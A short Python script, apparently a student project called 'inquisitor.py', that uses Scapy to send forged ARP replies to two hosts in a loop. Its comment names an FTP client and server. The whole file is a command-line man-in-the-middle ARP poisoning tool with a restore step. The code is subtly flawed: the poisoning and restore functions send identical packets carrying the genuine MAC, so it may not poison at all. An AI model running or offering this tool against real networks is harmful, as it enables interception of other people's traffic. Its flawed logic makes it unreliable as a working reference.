import time
import sys
from scapy.all import ARP, send


def arp_poison(target_ip, target_mac, source_ip, source_mac):
    arp_response = ARP(op=2, psrc=source_ip, pdst=target_ip, hwdst=target_mac, hwsrc=source_mac)
    send(arp_response, verbose=False)

def restore_arp(target_ip, target_mac, source_ip, source_mac):
    arp_response = ARP(op=2, psrc=source_ip, pdst=target_ip, hwdst=target_mac, hwsrc=source_mac)
    send(arp_response, count=5, verbose=False)


if __name__ == "__main__":
    if len(sys.argv) < 5:
        print("Usage: python3 inquisitor.py <IPsource> <MACsource> <IPtarget> <MACtarget>")
        sys.exit(1)

    IPsource = sys.argv[1]
    MACsource = sys.argv[2]
    IPtarget = sys.argv[3]
    MACtarget = sys.argv[4]

    try:
        print("Inquisitor is poisoning the network...")
        while True:
            # Envoie de paquets ARP pour empoisonner les deux machines (client et serveur FTP)
            arp_poison(IPtarget, MACtarget, IPsource, MACsource)
            arp_poison(IPsource, MACsource, IPtarget, MACtarget)
            time.sleep(1)
    except KeyboardInterrupt:
        print("Inquisitor has stopped poisoning the network.")
        restore_arp(IPtarget, MACtarget, IPsource, MACsource)
        restore_arp(IPsource, MACsource, IPtarget, MACtarget)
        print("ARP tables have been restored.")
        sys.exit(0)
